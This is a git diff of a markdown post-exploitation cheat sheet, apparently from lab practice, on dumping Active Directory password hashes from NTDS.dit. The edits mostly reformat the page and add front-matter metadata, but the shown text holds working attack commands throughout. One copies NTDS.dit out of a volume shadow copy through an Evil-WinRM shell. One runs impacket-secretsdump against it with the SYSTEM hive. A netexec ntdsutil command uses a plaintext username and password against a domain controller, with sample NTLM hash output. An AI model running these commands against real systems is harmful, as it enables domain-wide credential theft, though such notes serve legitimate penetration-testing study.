@@ -6,19 +6,24 @@ categories:
   - Windows
   - Post-Exploitation
   - Dump-Passwords
+
 tags:
   - Dump-NTDS
+
+cover: /img/ntds.png
+top_img: /img/bg-img.jpg
+description: Extract passwords from NTDS.
 ---
 
-➜ Required privilege
+➜ Required privilege 
 
-  * `Member of Domain Admins (DA)`
+- `Member of Domain Admins (DA)`
 
-  * `Member of Enterprise Admins (EA)`
+- `Member of Enterprise Admins (EA)`
 
-  * `Member of local Administrators group on the DC`
+- `Member of local Administrators group on the DC`
 
-  * `Backup Operators ( SeBackupPrivilege )`
+- `Backup Operators ( SeBackupPrivilege )`
 
 # Offline
 
@@ -34,19 +39,23 @@ Successfully created shadow copy for 'C:\'
 
 ### Copying NTDS.dit from the VSS
 
+
 ```bash
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
+
 ### Dump hashes
 
-➜ Since the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`, we need to transfer the `SYSTEM` registry with `NTDS.dit`
+➜ Since the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`, we need to transfer the `SYSTEM` registry with `NTDS.dit`
+
 
 ```bash
 impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
-# Remotely
+
+# Remotely 
 
 ### NetExec
 
@@ -56,3 +65,5 @@ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
 NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
+
+
